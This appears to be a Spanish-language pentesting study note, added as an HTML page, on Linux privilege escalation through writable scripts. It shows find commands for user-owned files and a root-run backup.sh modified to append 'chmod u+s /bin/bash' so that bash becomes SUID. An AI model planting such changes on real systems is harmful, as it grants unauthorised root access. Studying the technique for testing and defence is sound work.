@@ -1,0 +1,78 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Permisos de archivos | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="permisos-archivos">
+          <div class="note-tabbar">
+            <span>Permisos de archivos</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Linux/Permisos y rutas</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / linux / permisos y rutas</p>
+            <h2>Permisos de archivos</h2>
+
+            <p>Los permisos de archivos y scripts son relevantes cuando un proceso privilegiado ejecuta contenido que puede modificar un usuario no privilegiado.</p>
+
+            <section class="code-card">
+              <h3>Buscar binarios donde un usuario es propietario</h3>
+              <pre><code>find / -user &lt;username&gt; 2&gt;/dev/null
+
+# Ej. Encontramos un backup.sh
+#!/bin/bash
+
+cp -r /usr/share/wordpress /tmp/tmp_wp_uploads</code></pre>
+            </section>
+            <p>Si <code>/tmp/tmp_wp_uploads</code> aparece como propiedad de <code>root</code>, es una pista de que el script puede estar ejecutándose como <code>root</code>, por ejemplo mediante una tarea <code>cron</code>. Hay que confirmar el contexto antes de modificar nada.</p>
+            <section class="code-card">
+              <h3>backup.sh modificado: Esperar que root ejecute este script y otorgue permisos SUID a la bash</h3>
+              <pre><code>#!/bin/bash
+
+cp -r /usr/share/wordpress /tmp/tmp_wp_uploads
+chmod u+s /bin/bash</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Monitorizamos los permisos de la bash y ejecutamos la bash con SUID</h3>
+              <pre><code>watch -n 1 ls -l /bin/bash</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>linux</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>permisos</span>
+              <span>archivos</span>
+              <span>cron</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
